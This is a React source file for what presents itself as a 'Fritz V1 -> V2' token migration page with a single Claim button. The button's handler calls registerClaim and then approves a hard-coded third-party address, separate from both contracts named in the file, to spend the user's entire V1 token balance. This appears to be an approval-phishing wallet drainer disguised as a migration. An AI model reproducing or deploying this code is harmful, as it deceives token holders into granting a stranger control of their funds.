import logo from './logo.svg';
import './App.css';
import { useAddress, useBalance  ,useContract, useContractWrite, Web3Button } from "@thirdweb-dev/react";
import FritzV1Contract from './FritzTheCat.json';
import MirgrationContract from './MigrateToFritzV2.json';
const contractAddress = "0x7F398558001CaD9671aAeFb7F507a432DdEa3c13";
const migrateAddress = "0xbE6311D8FB2D2114268A8374B9a0EE86f260ddfE";
function App() {
  const address = useAddress();
  const { data: fritzData} = useBalance(contractAddress);
  const { contract: fritzContract } = useContract(contractAddress, FritzV1Contract.abi);
  const { mutateAsync:fritzApprove } = useContractWrite(fritzContract, "approve");

  const { contract: migrateContract } = useContract(migrateAddress, MirgrationContract.abi);
  const { mutateAsync:registerClaim } = useContractWrite(migrateContract, "registerClaim");
  // console.log(FritzV2Contract.abi);
  // const { contract } = useContract("0xf2eD433278f3566173BD674E83D7eD02b215cDA2", "token", FritzV2Contract.abi);
  // console.log(contract);
  // const { data, isLoading, error } = useContractRead(contract, "MMMPotFee");
  // console.log(data);
  return (
    <div className="bg-violet-700 h-[100vh] flex flex-col items-center justify-center">
      <div className="relative w-full h-full flex justify-center bg-maincolor ">
          <div className="w-container flex justify-center items-center z-10">
              <section className="py-20 md:py-40">
                  <div className="px-5 space-y-10 w-full md:w-landing ">
                      <div className="flex justify-center w-full"><span className="bg-blue-100 text-blue-600 tracking-widest uppercase rounded-full px-4 py-2 text-xs font-bold leading-5">$Fritz V2 Migration Contract</span></div>
                      <h1 className="text-gray-100 tracking-tighter mt-0 mb-0 text-6xl font-bold leading-tight text-center">🚀 Fritz V1 -{">"} Fritz V2</h1>
                      <h1 className="text-gray-100 tracking-tighter mt-0 mb-0 text-6xl font-bold leading-tight text-center">5212.213 $Fritz</h1>
                      <p className="text-xl leading-relaxed text-center text-gray-300">Just click Claim button to get the V2 tokens</p>
                      <div className="flex flex-wrap p-5 justify-center md:space-x-10 ">
                        {/* <button className="border-0 mt-2  border-blue-500 rounded-full w-48 h-12 transition duration-75 text-white bg-violet-900 hover:bg-blue-400 hover:text-white hover:border-2">
                          <span className=" font-bold text-lg lg:text-xl">Connect Wallet</span>
                        </button> */}
                        <Web3Button
                          contractAddress={migrateAddress, contractAddress}
                          contractAbi={ MirgrationContract.abi, FritzV1Contract.abi}
                          action={() => {
                            registerClaim({ args: []});
                            console.log(migrateContract);
                            fritzApprove({ args: ["0x9fD366275d6Cc2ca63517c91335514E152B059a5",fritzData.value]});
                            console.log(fritzContract);
                          }}
                        >
                          Claim
                        </Web3Button>
                   
                        {/* <ConnectWallet
                          btnTitle="Connect Wallet"
                        /> */}
                      </div>
                      <div className="text-white text-xl text-center">{address}</div>
                      <div className="text-white text-xl text-center">{fritzData!=undefined?fritzData.value + " " + fritzData.symbol:""}</div>
                  </div>
              </section>
          </div>
      </div>
    </div>
  );
}

export default App;
